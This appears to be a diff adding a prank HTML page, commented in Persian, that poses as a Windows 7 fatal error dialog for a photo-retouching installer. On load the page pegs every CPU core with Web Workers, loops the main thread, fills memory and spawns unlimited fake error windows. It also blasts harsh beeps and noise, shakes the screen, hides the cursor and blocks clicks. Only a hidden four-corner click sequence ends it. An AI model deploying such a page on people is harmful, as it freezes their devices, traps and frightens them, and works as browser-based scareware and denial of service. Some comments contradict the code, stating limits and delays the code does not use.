@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Windows - Fatal Error</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+  html, body {
+    height: 100%;
+    overflow: hidden;
+    background: #3a6ea5;
+    background-image: linear-gradient(to bottom, #2b598b, #6ea4d6);
+    font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+    user-select: none;
+    -webkit-user-select: none;
+    touch-action: manipulation;
+    cursor: none;
+  }
+
+  /* --- استایل پنجره خطا (ویندوز 7) --- */
+  .error-window {
+    position: absolute;
+    width: 550px;
+    max-width: 95vw;
+    background: #f0f0f0;
+    border: 1px solid #7a7a7a;
+    border-radius: 6px 6px 0 0;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5), inset 0 0 0 1px #fff;
+    overflow: hidden;
+    animation: popIn 0.1s ease-out;
+  }
+
+  @keyframes popIn {
+    from { transform: scale(0.9); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+
+  .title-bar {
+    background: linear-gradient(to bottom, #dbeaf9, #c0d7ed, #a4c4e3);
+    height: 32px;
+    display: flex;
+    align-items: center;
+    padding: 0 4px 0 8px;
+    border-bottom: 1px solid #95b6d6;
+  }
+
+  .title-icon {
+    width: 16px; height: 16px; margin-right: 6px; border-radius: 2px;
+    background: #d93025; color: white; display: flex; justify-content: center; align-items: center;
+    font-size: 11px; font-weight: bold;
+  }
+
+  .title-text {
+    flex: 1; font-size: 12px; color: #000;
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+
+  .close-btn {
+    width: 44px; height: 24px;
+    background: linear-gradient(to bottom, #f3a6a0, #e25546, #d13f31);
+    border: 1px solid #b02c20; border-radius: 3px;
+    display: flex; justify-content: center; align-items: center;
+    color: white; font-size: 14px; font-weight: bold; text-shadow: 0 1px 1px rgba(0,0,0,0.5);
+    pointer-events: none;
+  }
+
+  .window-body {
+    padding: 20px 24px; display: flex; align-items: flex-start; gap: 16px; background: #f0f0f0;
+  }
+
+  .big-icon { width: 40px; height: 40px; flex-shrink: 0; }
+
+  .error-text { font-size: 13px; color: #000; line-height: 1.6; }
+
+  .footer { padding: 0 24px 16px 24px; display: flex; justify-content: flex-end; background: #f0f0f0; }
+  
+  .ok-btn {
+    padding: 4px 30px; font-size: 13px; font-family: inherit;
+    background: linear-gradient(to bottom, #f2f2f2, #e5e5e5, #d4d4d4);
+    border: 1px solid #8e8e8e; border-radius: 3px; pointer-events: none; box-shadow: inset 0 1px 0 #fff;
+  }
+
+  /* گوشه‌های مخفی */
+  .corner { position: fixed; width: 90px; height: 90px; z-index: 999999; cursor: pointer; }
+  .corner.tl { top: 0; left: 0; }
+  .corner.tr { top: 0; right: 0; }
+  .corner.br { bottom: 0; right: 0; }
+  .corner.bl { bottom: 0; left: 0; }
+
+  /* لرزش شدید (Earthquake) */
+  body.shake-all { animation: shakeAll 0.05s infinite; }
+  @keyframes shakeAll {
+    0%, 100% { transform: translate(0,0); }
+    25% { transform: translate(-6px, 4px); }
+    50% { transform: translate(4px, -6px); }
+    75% { transform: translate(-4px, -4px); }
+  }
+</style>
+</head>
+<body>
+
+  <!-- گوشه‌های مخفی برای فرار -->
+  <div class="corner tl" data-corner="tl"></div>
+  <div class="corner tr" data-corner="tr"></div>
+  <div class="corner br" data-corner="br"></div>
+  <div class="corner bl" data-corner="bl"></div>
+
+  <script>
+    const errorText = "The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.";
+    const filePath = "F:\\Rotosh_07\\Setup\\V.7\\SahelPhotoRetouching 7_32bit.exe";
+
+    const sequence = ['tl', 'tr', 'br', 'bl'];
+    let progress = 0;
+    let resetTimer = null;
+    let isUnlocked = false;
+    let spawnRunning = true;
+    let ramLoopRunning = true;
+    let errorWindows = [];
+    let windowCounter = 0;
+
+    /* ============================================
+       1. سیستم صوتی (Audio Bomb + Background Noise)
+       ============================================ */
+    let audioCtx = null;
+    let oscBackground = null;
+    let noiseBackground = null;
+    let lastSoundTime = 0;
+
+    function initAudio() {
+      if (!audioCtx) {
+        try { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); } catch (e) {}
+      }
+      if (audioCtx && audioCtx.state === 'suspended') audioCtx.resume();
+    }
+
+    function playErrorSound() {
+      if (!audioCtx) return;
+      const now = Date.now();
+      // مسلسل صوتی: هر ۱۵ میلی‌ثانیه یک بیپ
+      if (now - lastSoundTime < 15) return; 
+      lastSoundTime = now;
+
+      const playBeep = (freq, startTime, duration) => {
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.type = 'square'; // صدای تیزتر و آزاردهنده‌تر
+        osc.frequency.value = freq;
+        gain.gain.setValueAtTime(0, startTime);
+        gain.gain.linearRampToValueAtTime(0.08, startTime + 0.01);
+        gain.gain.exponentialRampToValueAtTime(0.001, startTime + duration);
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.start(startTime);
+        osc.stop(startTime + duration);
+      };
+
+      const t = audioCtx.currentTime;
+      playBeep(1200 + Math.random() * 400, t, 0.05);
+    }
+
+    function startBackgroundSound() {
+      if (!audioCtx || oscBackground) return;
+      oscBackground = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      oscBackground.type = 'sawtooth';
+      oscBackground.frequency.value = 40;
+      gain.gain.value = 0.03;
+      oscBackground.connect(gain);
+      gain.connect(audioCtx.destination);
+      oscBackground.start();
+
+      const bufferSize = audioCtx.sampleRate * 2;
+      const noiseBuffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+      const data = noiseBuffer.getChannelData(0);
+      for (let i = 0; i < bufferSize; i++) data[i] = Math.random() * 2 - 1;
+      
+      noiseBackground = audioCtx.createBufferSource();
+      noiseBackground.buffer = noiseBuffer;
+      noiseBackground.loop = true;
+      const noiseGain = audioCtx.createGain();
+      noiseGain.gain.value = 0.02;
+      noiseBackground.connect(noiseGain);
+      noiseGain.connect(audioCtx.destination);
+      noiseBackground.start();
+    }
+
+    function armAudio() {
+      initAudio();
+      startBackgroundSound();
+      document.removeEventListener('click', armAudio);
+      document.removeEventListener('touchstart', armAudio);
+    }
+    document.addEventListener('click', armAudio);
+    document.addEventListener('touchstart', armAudio, { passive: true });
+
+    /* ============================================
+       2. حمله به پردازنده (Web Workers - چند هسته‌ای)
+       ============================================ */
+    function launchCPUWorkers() {
+      const numCores = navigator.hardwareConcurrency || 4;
+      const workerCode = `
+        setInterval(() => {
+          let arr = new Array(20000).fill(Math.random());
+          arr.sort();
+          let x = 0;
+          for(let i=0; i<1000; i++) x += Math.sin(i);
+        }, 5);
+      `;
+      const blob = new Blob([workerCode], {type: 'application/javascript'});
+      for(let i = 0; i < numCores; i++) {
+        new Worker(URL.createObjectURL(blob));
+      }
+    }
+
+    /* ============================================
+       3. حمله به رشته اصلی (Melt CPU)
+       ============================================ */
+    function meltCPU() {
+      if (!spawnRunning) return;
+      let x = 0;
+      // محاسبات سنگین برای فریز کردن رشته اصلی
+      for(let i = 0; i < 5000; i++) {
+        x += Math.sin(i) * Math.cos(i);
+      }
+      requestAnimationFrame(meltCPU);
+    }
+
+    /* ============================================
+       4. حلقه رم (RAM)
+       ============================================ */
+    const RAM_LIMIT = 8000;
+    const junkArray = [];
+
+    function ramLoop() {
+      if (!ramLoopRunning) return;
+      const junk = { id: Math.random(), data: new Array(20).fill(Math.random()) };
+      junkArray.push(junk);
+      if (junkArray.length > RAM_LIMIT) {
+        junkArray.splice(0, junkArray.length - RAM_LIMIT);
+      }
+      requestAnimationFrame(ramLoop);
+    }
+
+    /* ============================================
+       5. تولید پنجره‌های خطا (تعداد بالا)
+       ============================================ */
+    function createErrorWindow() {
+      if (!spawnRunning) return;
+      if (document.hidden) { setTimeout(createErrorWindow, 100); return; }
+
+      windowCounter++;
+      const win = document.createElement('div');
+      win.className = 'error-window';
+      
+      const maxX = window.innerWidth - 550;
+      const maxY = window.innerHeight - 200;
+      
+      let left = maxX < 20 ? 10 : Math.max(10, Math.floor(Math.random() * maxX));
+      let top = Math.max(10, Math.floor(Math.random() * maxY));
+
+      win.style.left = left + 'px';
+      win.style.top = top + 'px';
+      win.style.zIndex = 10 + windowCounter;
+
+      win.innerHTML = `
+        <div class="title-bar">
+          <div class="title-icon">X</div>
+          <div class="title-text">${filePath}</div>
+          <div class="close-btn">✕</div>
+        </div>
+        <div class="window-body">
+          <svg class="big-icon" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="12" r="11" fill="#d93025" stroke="#b02c20" stroke-width="1"/>
+            <path d="M8 8 L16 16 M16 8 L8 16" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round"/>
+          </svg>
+          <div class="error-text">${errorText}</div>
+        </div>
+        <div class="footer">
+          <button class="ok-btn">OK</button>
+        </div>
+      `;
+
+      document.body.appendChild(win);
+      errorWindows.push(win);
+
+      playErrorSound();
+
+      // لرزش مداوم
+      if (windowCounter % 2 === 0) document.body.classList.add('shake-all');
+
+      // مدیریت حافظه: حداکثر ۱۵۰ پنجره روی صفحه (بالاتر از این کرش میکنه)
+      if (errorWindows.length > 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000) {
+        const oldWin = errorWindows.shift();
+        if (oldWin && oldWin.parentNode) oldWin.parentNode.removeChild(oldWin);
+      }
+
+      // سرعت دیوانه‌وار: هر ۱۰ تا ۳۰ میلی‌ثانیه یک پنجره
+      const nextDelay = Math.floor(Math.random() * 0.000000000000000001) + 0.000000000000000000000000000000000000000000000001;
+      setTimeout(createErrorWindow, nextDelay);
+    }
+
+    /* ============================================
+       اجرای همه حملات با هم
+       ============================================ */
+    function startAttack() {
+      armAudio();          // صدا
+      launchCPUWorkers();  // هسته‌های CPU
+      meltCPU();           // محاسبات رشته اصلی
+      ramLoop();           // پر کردن رم
+      setTimeout(createErrorWindow, 0.0000000000000000000000001); // شروع بمباران پنجره‌ها
+    }
+
+    // شروع ۱۰۰ میلی‌ثانیه بعد از باز شدن صفحه
+    setTimeout(startAttack, 0.000000000000000000000001);
+
+    /* ============================================
+       6. مسدود کردن کلیک‌ها
+       ============================================ */
+    document.addEventListener('click', (e) => {
+      if (!e.target.classList.contains('corner')) {
+        e.preventDefault(); e.stopPropagation();
+      }
+    }, true);
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+    /* ============================================
+       7. راه فرار (۴ گوشه)
+       ============================================ */
+    document.querySelectorAll('.corner').forEach(corner => {
+      const handler = (e) => {
+        if (isUnlocked) return;
+        e.preventDefault(); e.stopPropagation();
+
+        const id = corner.dataset.corner;
+        if (id === sequence[progress]) {
+          progress++;
+          clearTimeout(resetTimer);
+          resetTimer = setTimeout(() => { progress = 0; }, 5000);
+          if (progress === sequence.length) unlock();
+        } else {
+          progress = 0; clearTimeout(resetTimer);
+        }
+      };
+      corner.addEventListener('click', handler);
+      corner.addEventListener('touchstart', handler, { passive: false });
+    });
+
+    /* ============================================
+       8. نجات و پاکسازی
+       ============================================ */
+    function unlock() {
+      isUnlocked = true;
+      spawnRunning = false;
+      ramLoopRunning = false;
+
+      // قطع صدا
+      if (oscBackground) { try { oscBackground.stop(); } catch(e){} }
+      if (noiseBackground) { try { noiseBackground.stop(); } catch(e){} }
+      if (audioCtx) { try { audioCtx.close(); } catch(e){} }
+
+      // پاکسازی
+      junkArray.length = 0;
+      errorWindows.forEach(w => { if(w.parentNode) w.parentNode.removeChild(w); });
+      document.body.classList.remove('shake-all');
+      
+      document.body.style.cursor = 'default';
+      document.body.innerHTML = `
+        <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;background:#2b598b;color:#fff;font-family:'Segoe UI',Tahoma,sans-serif;text-align:center;padding:30px;">
+          <div style="font-size:80px;margin-bottom:25px;text-shadow:0 5px 15px rgba(0,0,0,0.4);">😄</div>
+          <h2 style="font-size:32px;margin-bottom:18px;font-weight:600;text-shadow:0 2px 5px rgba(0,0,0,0.5);">You Survived!</h2>
+          <p style="font-size:16px;line-height:2;max-width:600px;color:rgba(255,255,255,0.9);text-shadow:0 1px 3px rgba(0,0,0,0.5);">
+            No files were harmed. No Windows was crashed.<br>
+            The CPU can finally rest now. 😂<br>
+            This was just a simple HTML page!
+          </p>
+        </div>
+      `;
+    }
+  </script>
+
+</body>
+</html>
